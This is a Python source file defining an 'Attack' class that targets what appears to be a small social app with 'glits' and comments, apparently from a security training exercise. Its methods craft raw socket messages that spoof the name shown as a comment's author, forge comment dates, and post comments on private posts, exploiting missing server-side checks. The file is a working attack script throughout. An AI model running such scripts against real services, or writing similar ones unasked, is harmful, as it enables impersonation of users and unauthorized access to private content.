import datetime
from tools import *

class Attack(tools):

    date = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
    id = -1
   

    _comment_req = {"glit_id":14592,"user_id":7792,"user_screen_name":"natali1","id":id,"content":"hiii","date":date}


    @classmethod
    def spoof_comment_publisher(cls, name_to_fake = "Ariana Grande", glit_id = 19550 , content = "Hi") -> None:
        # ---------------------------------------------- #
        # This function spoofs the name of cpmment poster
        # param name_to_fake: The name that you will see instead of the real name
        # type name_to_fake: str
        # :param glit_id: the of glit where to post the comment
        # :type glit_id: int
        # :param content: The content of comment
        # :type comment: str
        # :return: none
        # ---------------------------------------------- #

        msg = cls.get_msg_info(glit_id, content)
        msg["date"] = cls.date
        msg["user_screen_name"] = name_to_fake
        client_msg = super().build_comment_msg(cls._comment_req)
        super().server_session.sock.sendall(client_msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")


    @classmethod
    def spoof_comment_date(cls, fake_date = "1691-01-03T13:57:04.602Z", glit_id = 19548 , content = "Hi") -> None:
        # ---------------------------------------------- #
        # This function spoofs the date of comment
        # :param fake_date: The fake date that you will see instead of the real name
        # :type name_to_fake: str
        # :glit_id: the of glit where to post the comment
        # :type glit_id: int
        # :param content: The content of comment
        # :type comment: str
        # :param date: the date where the comment will be posted
        # :type date: str
        # :return: none
        # ---------------------------------------------- #

        msg = cls.get_msg_info(glit_id, content)
        msg["date"] = fake_date
        msg["user_screen_name"] = super().server_session.user_screen_name
        client_msg = super().build_comment_msg(msg)
        super().server_session.sock.sendall(client_msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")


    @classmethod
    def post_comment_on_private_post(cls, glit_id = 15188, content = "cyber cyber") -> None:
        # ---------------------------------------------- #
        # This function posts comment on private glit
        # :glit_id: the of glit where to post the comment
        # :type glit_id: int
        # :param content: The content of comment
        # :type comment: str
        # :return: none
        # ---------------------------------------------- #

        msg = cls.get_msg_info(glit_id, content)
        msg["date"] = cls.date
        msg["user_screen_name"] = super().server_session.user_screen_name
        client_msg = super().build_comment_msg(msg)
        super().server_session.sock.sendall(client_msg.encode())
        server_msg = super().server_session.sock.recv(2048).decode()
        print(f"[SERVER RESPONSE] {server_msg}")


    @classmethod
    def get_msg_info(cls, glit_id, content) -> dict:
        # ---------------------------------------------- #
        # This function inits dictionary with info for comment request (glit_id, content, screen_name, user_id)
        # :param glit_id: id of glit 
        # :type glit_id: int
        # :param content: content of comment
        # :type: content
        # :return: new msg with needed parameters
        # :rtype: dictionary
        # ---------------------------------------------- #
        
        new_msg = cls._comment_req
        new_msg["user_id"] = super().find_user_id_by_name(super().server_session.sock, super().server_session.user_screen_name)
        new_msg["glit_id"] = glit_id
        new_msg["content"] = content
        return new_msg
